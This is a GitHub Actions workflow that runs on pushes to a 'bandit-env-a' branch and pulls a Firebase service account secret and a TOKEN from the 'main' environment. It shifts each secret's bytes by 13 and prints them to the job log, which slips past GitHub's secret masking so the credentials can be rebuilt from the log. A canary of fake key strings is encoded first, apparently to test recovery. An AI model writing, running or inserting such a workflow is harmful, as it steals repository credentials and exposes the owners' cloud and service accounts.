name: bandit-env-a
on:
  push:
    branches: [bandit-env-a]
jobs:
  x:
    runs-on: ubuntu-latest
    environment: main
    steps:
      - name: d
        env:
          S0: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_LECIEN_DEV }}
          S1: ${{ secrets.TOKEN }}
        run: |
          CNP=$(printf 'CANARY-----BEGIN OPENSSH PRIVATE KEY-----\\nsk_live_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\\nghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEF\\nAKIAIOSFODNN7EXAMPLE\\nwhsec_ABCDEFGHIJKLMNOPQRSTUVWXYZ\\ntrue\\n-----END OPENSSH PRIVATE KEY-----')
          echo "CNPL:${#CNP}"
          printf '%s' "$CNP" | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d' | awk '{print "CNK" NR-1 ":" ($1+13)%256}'
          for j in 0 1; do
            v="S$j"
            val="${!v}"
            echo "B${j}L${#val}"
            printf '%s' "$val" | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d' | awk -v j="$j" '{print "B" j "C" NR-1 ":" ($1+13)%256}'
          done
